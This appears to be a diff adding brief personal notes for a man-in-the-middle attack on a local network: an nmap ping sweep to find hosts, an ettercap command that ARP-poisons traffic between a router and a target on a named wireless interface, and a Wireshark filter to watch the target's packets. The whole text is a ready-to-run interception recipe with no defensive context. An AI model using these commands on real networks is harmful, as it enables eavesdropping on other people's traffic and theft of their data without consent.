@@ -1,0 +1,9 @@
+nmap -sn 192.168.43.0/24  for getting local ip address
+
+ettercap -T -S -i wlx1cbfce04e4dd -M arp:remote /router_ip// /target_ip//
+
+use wireshark to see the traffic
+filter => ip.addr == target_ip
+
+
+
